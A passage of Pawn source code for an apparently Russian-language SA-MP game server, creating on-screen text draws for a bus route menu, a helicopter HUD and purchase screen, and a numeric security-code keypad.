	PlayerTextDrawFont(playerid, bus[7][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, bus[7][playerid], true);

	bus[8][playerid] = CreatePlayerTextDraw(playerid, 458.639984, 168.199096, "остановка: ~y~г. Арзамас~n~~w~стоимость проезда: ~y~от 25р~n~~w~номер маршрута: ~y~1~n~~w~номер автобуса: ~y~401");
	PlayerTextDrawLetterSize(playerid, bus[8][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[8][playerid], 1);
	PlayerTextDrawColor(playerid, bus[8][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[8][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[8][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[8][playerid], 51);
	PlayerTextDrawFont(playerid, bus[8][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[8][playerid], 1);

	bus[9][playerid] = CreatePlayerTextDraw(playerid, 493.350982, 209.685989, "г. Арзамас - Анашан");
	PlayerTextDrawLetterSize(playerid, bus[9][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[9][playerid], 1);
	PlayerTextDrawColor(playerid, bus[9][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[9][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[9][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[9][playerid], 51);
	PlayerTextDrawFont(playerid, bus[9][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[9][playerid], 1);

	bus[10][playerid] = CreatePlayerTextDraw(playerid, 468.946563, 263.671844, "далее");
	PlayerTextDrawLetterSize(playerid, bus[10][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[10][playerid], 1);
	PlayerTextDrawColor(playerid, bus[10][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[10][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[10][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[10][playerid], 51);
	PlayerTextDrawFont(playerid, bus[10][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[10][playerid], 1);

	bus[11][playerid] = CreatePlayerTextDraw(playerid, 579.720581, 264.074371, "отмена");
	PlayerTextDrawLetterSize(playerid, bus[11][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[11][playerid], 1);
	PlayerTextDrawColor(playerid, bus[11][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[11][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[11][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[11][playerid], 51);
	PlayerTextDrawFont(playerid, bus[11][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[11][playerid], 1);

	bus[12][playerid] = CreatePlayerTextDraw(playerid, 457.924530, 208.871276, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, bus[12][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, bus[12][playerid], 163.777786, 12.195554);
	PlayerTextDrawAlignment(playerid, bus[12][playerid], 1);
	PlayerTextDrawColor(playerid, bus[12][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[12][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[12][playerid], 0);
	PlayerTextDrawFont(playerid, bus[12][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, bus[12][playerid], true);

	bus[13][playerid] = CreatePlayerTextDraw(playerid, 458.124542, 224.804458, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, bus[13][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, bus[13][playerid], 163.777786, 12.195551);
	PlayerTextDrawAlignment(playerid, bus[13][playerid], 1);
	PlayerTextDrawColor(playerid, bus[13][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[13][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[13][playerid], 0);
	PlayerTextDrawFont(playerid, bus[13][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, bus[13][playerid], true);

	bus[4][playerid] = CreatePlayerTextDraw(playerid, 493.510955, 225.419998, "г. Арзамас - г. Южный");
	PlayerTextDrawLetterSize(playerid, bus[4][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[4][playerid], 1);
	PlayerTextDrawColor(playerid, bus[4][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[4][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[4][playerid], 51);
	PlayerTextDrawFont(playerid, bus[4][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[4][playerid], 1);

	copter_speed[0][playerid] = CreatePlayerTextDraw(playerid, 478.799987, 406.193328, "usebox");
	PlayerTextDrawLetterSize(playerid, copter_speed[0][playerid], 0.000000, 2.835924);
	PlayerTextDrawTextSize(playerid, copter_speed[0][playerid], 618.400024, 0.000000);
	PlayerTextDrawAlignment(playerid, copter_speed[0][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[0][playerid], 0);
	PlayerTextDrawUseBox(playerid, copter_speed[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, copter_speed[0][playerid], 102);
	PlayerTextDrawSetShadow(playerid, copter_speed[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[0][playerid], 0);
	PlayerTextDrawFont(playerid, copter_speed[0][playerid], 0);

	copter_speed[1][playerid] = CreatePlayerTextDraw(playerid, 479.960052, 403.808471, "usebox");
	PlayerTextDrawLetterSize(playerid, copter_speed[1][playerid], 0.022799, -0.170653);
	PlayerTextDrawTextSize(playerid, copter_speed[1][playerid], 617.680053, 0.000000);
	PlayerTextDrawAlignment(playerid, copter_speed[1][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[1][playerid], 0);
	PlayerTextDrawUseBox(playerid, copter_speed[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, copter_speed[1][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, copter_speed[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[1][playerid], 0);
	PlayerTextDrawFont(playerid, copter_speed[1][playerid], 0);

	copter_speed[2][playerid] = CreatePlayerTextDraw(playerid, 531.640380, 404.643493, "вертолет");
	PlayerTextDrawLetterSize(playerid, copter_speed[2][playerid], 0.187599, 0.768710);
	PlayerTextDrawAlignment(playerid, copter_speed[2][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[2][playerid], -1);
	PlayerTextDrawSetShadow(playerid, copter_speed[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[2][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, copter_speed[2][playerid], 51);
	PlayerTextDrawFont(playerid, copter_speed[2][playerid], 2);
	PlayerTextDrawSetProportional(playerid, copter_speed[2][playerid], 1);

	copter_speed[3][playerid] = CreatePlayerTextDraw(playerid, 479.600250, 412.910919, "скорость: 228 ei/?~n~высота: 1000.1 м");
	PlayerTextDrawLetterSize(playerid, copter_speed[3][playerid], 0.144799, 0.813510);
	PlayerTextDrawAlignment(playerid, copter_speed[3][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[3][playerid], -1);
	PlayerTextDrawSetShadow(playerid, copter_speed[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[3][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, copter_speed[3][playerid], 51);
	PlayerTextDrawFont(playerid, copter_speed[3][playerid], 2);
	PlayerTextDrawSetProportional(playerid, copter_speed[3][playerid], 1);

	copter_speed[4][playerid] = CreatePlayerTextDraw(playerid, 575.399658, 412.322296, "двигатель~n~двери");
	PlayerTextDrawLetterSize(playerid, copter_speed[4][playerid], 0.144798, 0.813510);
	PlayerTextDrawAlignment(playerid, copter_speed[4][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[4][playerid], -1);
	PlayerTextDrawSetShadow(playerid, copter_speed[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[4][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, copter_speed[4][playerid], 51);
	PlayerTextDrawFont(playerid, copter_speed[4][playerid], 2);
	PlayerTextDrawSetProportional(playerid, copter_speed[4][playerid], 1);

	copter_speed[5][playerid] = CreatePlayerTextDraw(playerid, 610.600097, 412.110229, "ld_beat:chit");
	PlayerTextDrawLetterSize(playerid, copter_speed[5][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, copter_speed[5][playerid], 8.000000, 8.462219);
	PlayerTextDrawAlignment(playerid, copter_speed[5][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[5][playerid], -1);
	PlayerTextDrawSetShadow(playerid, copter_speed[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[5][playerid], 0);
	PlayerTextDrawFont(playerid, copter_speed[5][playerid], 4);

	copter_speed[6][playerid] = CreatePlayerTextDraw(playerid, 610.960266, 420.278259, "ld_beat:chit");
	PlayerTextDrawLetterSize(playerid, copter_speed[6][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, copter_speed[6][playerid], 8.000000, 8.462219);
	PlayerTextDrawAlignment(playerid, copter_speed[6][playerid], 1);
	PlayerTextDrawColor(playerid, copter_speed[6][playerid], -1);
	PlayerTextDrawSetShadow(playerid, copter_speed[6][playerid], 0);
	PlayerTextDrawSetOutline(playerid, copter_speed[6][playerid], 0);
	PlayerTextDrawFont(playerid, copter_speed[6][playerid], 4);

	buy_copter[0][playerid] = CreatePlayerTextDraw(playerid, 433.199829, 375.629638, "usebox");
	PlayerTextDrawLetterSize(playerid, buy_copter[0][playerid], 0.530399, 5.862743);
	PlayerTextDrawTextSize(playerid, buy_copter[0][playerid], 216.000122, 17.422224);
	PlayerTextDrawAlignment(playerid, buy_copter[0][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[0][playerid], 0);
	PlayerTextDrawUseBox(playerid, buy_copter[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, buy_copter[0][playerid], 102);
	PlayerTextDrawSetShadow(playerid, buy_copter[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[0][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[0][playerid], 2);

	buy_copter[1][playerid] = CreatePlayerTextDraw(playerid, 433.319915, 362.642089, "usebox");
	PlayerTextDrawLetterSize(playerid, buy_copter[1][playerid], 0.505999, 1.049244);
	PlayerTextDrawTextSize(playerid, buy_copter[1][playerid], 215.679794, 20.807113);
	PlayerTextDrawAlignment(playerid, buy_copter[1][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[1][playerid], 0);
	PlayerTextDrawUseBox(playerid, buy_copter[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, buy_copter[1][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, buy_copter[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[1][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[1][playerid], 2);

	buy_copter[2][playerid] = CreatePlayerTextDraw(playerid, 264.360137, 360.789245, "покупка вертолета");
	PlayerTextDrawLetterSize(playerid, buy_copter[2][playerid], 0.278887, 1.256533);
	PlayerTextDrawAlignment(playerid, buy_copter[2][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[2][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[2][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, buy_copter[2][playerid], 51);
	PlayerTextDrawFont(playerid, buy_copter[2][playerid], 2);
	PlayerTextDrawSetProportional(playerid, buy_copter[2][playerid], 1);

	buy_copter[3][playerid] = CreatePlayerTextDraw(playerid, 216.440200, 382.393096, "ld_beat:left");
	PlayerTextDrawLetterSize(playerid, buy_copter[3][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[3][playerid], 17.599987, 23.395570);
	PlayerTextDrawAlignment(playerid, buy_copter[3][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[3][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[3][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[3][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[3][playerid], true);

	buy_copter[4][playerid] = CreatePlayerTextDraw(playerid, 415.285797, 383.841003, "ld_beat:right");
	PlayerTextDrawLetterSize(playerid, buy_copter[4][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[4][playerid], 17.599987, 23.395570);
	PlayerTextDrawAlignment(playerid, buy_copter[4][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[4][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[4][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[4][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[4][playerid], true);

	buy_copter[5][playerid] = CreatePlayerTextDraw(playerid, 266.359710, 387.076507, "стоимость: ~y~20000000 рублей");
	PlayerTextDrawLetterSize(playerid, buy_copter[5][playerid], 0.178885, 1.286399);
	PlayerTextDrawAlignment(playerid, buy_copter[5][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[5][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[5][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, buy_copter[5][playerid], 51);
	PlayerTextDrawFont(playerid, buy_copter[5][playerid], 2);
	PlayerTextDrawSetProportional(playerid, buy_copter[5][playerid], 1);

	buy_copter[6][playerid] = CreatePlayerTextDraw(playerid, 292.120208, 410.766113, "ld_beat:left");
	PlayerTextDrawLetterSize(playerid, buy_copter[6][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[6][playerid], 15.200012, 14.933347);
	PlayerTextDrawAlignment(playerid, buy_copter[6][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[6][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[6][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[6][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[6][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[6][playerid], true);

	buy_copter[7][playerid] = CreatePlayerTextDraw(playerid, 340.320007, 410.472015, "ld_beat:right");
	PlayerTextDrawLetterSize(playerid, buy_copter[7][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[7][playerid], 15.200012, 14.933347);
	PlayerTextDrawAlignment(playerid, buy_copter[7][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[7][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[7][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[7][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[7][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[7][playerid], true);

	buy_copter[8][playerid] = CreatePlayerTextDraw(playerid, 315.320007, 410.774780, "ЦВЕТ");
	PlayerTextDrawLetterSize(playerid, buy_copter[8][playerid], 0.178885, 1.286399);
	PlayerTextDrawAlignment(playerid, buy_copter[8][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[8][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[8][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[8][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, buy_copter[8][playerid], 51);
	PlayerTextDrawFont(playerid, buy_copter[8][playerid], 2);
	PlayerTextDrawSetProportional(playerid, buy_copter[8][playerid], 1);

	buy_copter[9][playerid] = CreatePlayerTextDraw(playerid, 230.799362, 411.712188, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, buy_copter[9][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[9][playerid], 41.600006, 13.440002);
	PlayerTextDrawAlignment(playerid, buy_copter[9][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[9][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, buy_copter[9][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[9][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[9][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[9][playerid], true);

	buy_copter[10][playerid] = CreatePlayerTextDraw(playerid, 377.319580, 411.915588, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, buy_copter[10][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, buy_copter[10][playerid], 41.600006, 13.440002);
	PlayerTextDrawAlignment(playerid, buy_copter[10][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[10][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, buy_copter[10][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[10][playerid], 0);
	PlayerTextDrawFont(playerid, buy_copter[10][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, buy_copter[10][playerid], true);

	buy_copter[11][playerid] = CreatePlayerTextDraw(playerid, 237.920150, 412.168975, "КУПИТЬ");
	PlayerTextDrawLetterSize(playerid, buy_copter[11][playerid], 0.178885, 1.286399);
	PlayerTextDrawAlignment(playerid, buy_copter[11][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[11][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[11][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[11][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, buy_copter[11][playerid], 51);
	PlayerTextDrawFont(playerid, buy_copter[11][playerid], 2);
	PlayerTextDrawSetProportional(playerid, buy_copter[11][playerid], 1);

	buy_copter[12][playerid] = CreatePlayerTextDraw(playerid, 384.600158, 411.974578, "ОТМЕНА");
	PlayerTextDrawLetterSize(playerid, buy_copter[12][playerid], 0.178885, 1.286399);
	PlayerTextDrawAlignment(playerid, buy_copter[12][playerid], 1);
	PlayerTextDrawColor(playerid, buy_copter[12][playerid], -1);
	PlayerTextDrawSetShadow(playerid, buy_copter[12][playerid], 0);
	PlayerTextDrawSetOutline(playerid, buy_copter[12][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, buy_copter[12][playerid], 51);
	PlayerTextDrawFont(playerid, buy_copter[12][playerid], 2);
	PlayerTextDrawSetProportional(playerid, buy_copter[12][playerid], 1);

    SecurityCode[playerid][9] = CreatePlayerTextDraw(playerid, 510.666870, 282.088989, "box");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][9], 0.000000, 10.890344);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][9], 571.493652, 0.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][9], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][9], -222);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][9], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][9], -222);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][9], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][9], 1);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][9], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][9], 0);

    SecurityCode[playerid][0] = CreatePlayerTextDraw(playerid, 513.333374, 287.066650, "1");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][0], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][0], 528.666748, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][0], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][0], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][0], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][0], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][0], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][0], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][0], true);

	SecurityCode[playerid][5] = CreatePlayerTextDraw(playerid, 533.228515, 287.066650, "6");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][5], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][5], 548.561889, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][5], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][5], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][5], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][5], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][5], true);

	SecurityCode[playerid][2] = CreatePlayerTextDraw(playerid, 553.523559, 287.066650, "3");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][2], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][2], 568.856933, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][2], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][2], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][2], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][2], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][2], true);

	SecurityCode[playerid][4] = CreatePlayerTextDraw(playerid, 553.523559, 318.868591, "5");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][4], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][4], 568.856933, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][4], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][4], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][4], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][4], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][4], true);

	SecurityCode[playerid][7] = CreatePlayerTextDraw(playerid, 533.228515, 318.868591, "8");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][7], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][7], 548.561889, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][7], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][7], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][7], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][7], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][7], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][7], true);

	SecurityCode[playerid][6] = CreatePlayerTextDraw(playerid, 513.233398, 318.868591, "7");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][6], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][6], 528.566772, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][6], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][6], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][6], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][6], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][6], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][6], true);

	SecurityCode[playerid][1] = CreatePlayerTextDraw(playerid, 513.233398, 350.770538, "2");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][1], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][1], 528.566772, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][1], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][1], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][1], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][1], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][1], true);

	SecurityCode[playerid][3] = CreatePlayerTextDraw(playerid, 533.328491, 350.770538, "4");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][3], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][3], 548.661865, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][3], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][3], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][3], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][3], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][3], true);

	SecurityCode[playerid][8] = CreatePlayerTextDraw(playerid, 553.523559, 350.770538, "9");
	PlayerTextDrawLetterSize(playerid, SecurityCode[playerid][8], 0.760999, 2.894222);
	PlayerTextDrawTextSize(playerid, SecurityCode[playerid][8], 568.856933, 18.000000);
	PlayerTextDrawAlignment(playerid, SecurityCode[playerid][8], 1);
	PlayerTextDrawColor(playerid, SecurityCode[playerid][8], -1);
	PlayerTextDrawUseBox(playerid, SecurityCode[playerid][8], 1);
	PlayerTextDrawBoxColor(playerid, SecurityCode[playerid][8], -5963521);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, SecurityCode[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, SecurityCode[playerid][8], 255);
	PlayerTextDrawFont(playerid, SecurityCode[playerid][8], 3);
	PlayerTextDrawSetProportional(playerid, SecurityCode[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid, SecurityCode[playerid][8], 0);
	PlayerTextDrawSetSelectable(playerid, SecurityCode[playerid][8], true);

	PlayerMenu[playerid][0] = CreatePlayerTextDraw(playerid, 590.594909, 182.916656, "usebox");
	PlayerTextDrawLetterSize(playerid, PlayerMenu[playerid][0], 0.000000, 13.970151);
	PlayerTextDrawTextSize(playerid, PlayerMenu[playerid][0], 438.542022, 0.000000);
